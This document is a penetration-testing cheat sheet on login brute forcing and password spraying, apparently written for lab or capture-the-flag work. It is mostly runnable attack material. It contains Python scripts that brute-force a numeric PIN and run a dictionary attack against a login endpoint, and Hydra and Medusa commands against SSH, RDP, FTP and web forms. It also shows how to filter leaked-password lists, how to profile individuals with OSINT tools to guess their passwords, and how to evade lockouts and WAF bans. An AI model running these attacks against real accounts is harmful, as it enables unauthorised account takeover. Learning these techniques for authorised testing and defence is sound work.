# Login Brute Forcing & Password Spraying
**Concept:** Authentication layers are the primary gateway to privileged access. When logic bypasses (Phase 09) fail, we revert to systematic credential testing. 
**Scope:** HTTP/S Forms, SSH, FTP, RDP, SMB, SQL.
## 1. Custom Tooling (Python)
**Goal:** Create bespoke scripts for non-standard authentication endpoints (e.g., REST APIs, PIN pads) where standard tools fail to parse the response correctly.
### PIN Brute-Forcer
**Scenario:** Target uses a simple numeric PIN (0000-9999) via a GET request. 
**Tradecraft:** Use `f-strings` for padding (e.g., `0007`) and `requests` for HTTP handling.
```PYTHON
import requests

# Configuration
target_ip = "127.0.0.1"
target_port = 1234

# Execution Loop
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Pad with zeros
    # print(f"Testing: {formatted_pin}") # Toggle for verbosity

    try:
        r = requests.get(f"http://{target_ip}:{target_port}/pin?pin={formatted_pin}")
        if r.ok and 'flag' in r.json():
            print(f"[+] Success! PIN: {formatted_pin}")
            print(f"[+] Flag: {r.json()['flag']}")
            break
    except Exception as e:
        print(f"[-] Connection Error: {e}")
```
### Dictionary Attack Script
**Scenario:** Target uses standard password authentication via POST request. 
**Tradecraft:** Iterate through a wordlist file, cleaning newlines to avoid payload corruption.
```PYTHON
import requests

target = "http://127.0.0.1:1234/dictionary"
wordlist_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"

# Fetch Wordlist
passwords = requests.get(wordlist_url).text.splitlines()

for password in passwords:
    r = requests.post(target, data={'password': password})
    if r.ok and 'flag' in r.json():
        print(f"[+] Password Found: {password}")
        break
```
## 2. Operational Tradecraft: Wordlists
**Goal:** Optimize attack efficiency by selecting the _right_ list for the _right_ context. **Quality > Quantity.**

| **List Name**                     | **Context / Use Case**                                                     | **Source**                  |
| ----------------------------- | ---------------------------------------------------------------------- | ----------------------- |
| `rockyou.txt`                 | **The Standard.** Leaked passwords. Good for general cracking.         | SecLists / Kali Default |
| `top-usernames-shortlist.txt` | **Enumeration.** Validating user existence before attacking.           | SecLists (Usernames)    |
| `2023-200_most_used...`       | **Spray.** "Low and Slow" attacks against many users to avoid lockout. | SecLists (Passwords)    |
| `default-passwords.txt`       | **Infrastructure.** Routers, IoT, Admin Panels.                        | SecLists (Defaults)     |
### Hybrid List Generation (Bash)
**Goal:** Refine a large list (e.g., Darkweb leaks) to match a specific password policy (e.g., Min 8 chars, 1 Upper, 1 Lower, 1 Number).
```shell
# 1. Download Source
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

# 2. Filter Chain (Length -> Upper -> Lower -> Number)
grep -E '^.{8,}$' darkweb2017-top10000.txt > list-len.txt
grep -E '[A-Z]' list-len.txt > list-upper.txt
grep -E '[a-z]' list-upper.txt > list-lower.txt
grep -E '[0-9]' list-lower.txt > list-final.txt

# 3. Verify
wc -l list-final.txt
```
## 3. Hydra (The Workhorse)
**Role:** Parallelized login cracker supporting 50+ protocols. 
**Syntax:** `hydra [Login] [Password] [Target] [Service] [Flags]`
### Critical Flags
- `-l` / `-L`: Single Login / List of Logins.
- `-p` / `-P`: Single Password / List of Passwords.
- `-s`: Non-default port.
- `-t 4`: Threads (Keep low for HTTP to avoid DoS/WAF bans).
- `-f`: **Exit on Found** (Crucial for speed).
### Service: SSH
```shell
# Attack root with a password list
hydra -l root -P rockyou.txt -t 4 192.168.1.10 ssh
```
### Service: HTTP POST Form
**Complexity:** Requires identifying the `URL`, `Body`, and `Failure String`. 
**Syntax:** `http-post-form "/path:body:InvalidString"` 
**Placeholders:** `^USER^` and `^PASS^`.
```shell
# 1. Identify Parameters via Burp/Developer Tools
# URL: /login.php
# Body: user=admin&pass=secret&login=true
# Failure Message: "Incorrect password"

# 2. Execute
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^&login=true:F=Incorrect password"
```
### Service: RDP
**OPSEC Warning:** RDP brute-forcing is extremely noisy and slow. It creates thousands of Event ID 4625 logs.
```shell
hydra -L users.txt -p 'Password123!' 192.168.1.50 rdp
```
## 4. Medusa (The Alternative)
**Role:** Similar to Hydra but module-based. Often more stable for specific protocols like SSHv2. 
**Syntax:** `medusa -h [Target] -u [User] -P [PassList] -M [Module] [Flags]`
### Critical Flags
- `-h`: Host IP.
- `-u` / `-U`: User / User List.
- `-p` / `-P`: Pass / Pass List.
- `-M`: Module (ssh, ftp, http, mysql).
- `-n`: Port number.
### Execution Examples
```shell
# SSH Attack
medusa -h 192.168.0.100 -u root -P rockyou.txt -M ssh -t 5

# FTP Attack (Non-Standard Port)
medusa -h 127.0.0.1 -n 2121 -u ftpuser -P passwords.txt -M ftp

# Web Form (Similar logic to Hydra)
medusa -h 10.10.10.10 -u admin -P passwords.txt -M web-form -m FORM:"user=^USER^&pass=^PASS^:F=Invalid"
```
## 5. Targeted Profiling (Custom Wordlists)
**Concept:** Generic wordlists fail against specific targets. Use OSINT to generate lists based on the target's personal information.
### Username Anarchy
**Goal:** Generate valid username formats (j.smith, smithj, jsmith) from a list of real names.
```shell
# Setup
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Execute
./username-anarchy -i names.txt
# Output:
# jane.doe
# jdoe
# doej
```
### CUPP (Common User Password Profiler)
**Goal:** Generate password permutations based on birthdates, pet names, company names, etc.
```shell
# Interactive Mode
cupp -i

# Inputs:
# Name: Jane
# Pet: Spot
# Year: 1990

# Result: Generates 'Jane1990', 'Spot123', 'JaneSpot!', etc.
```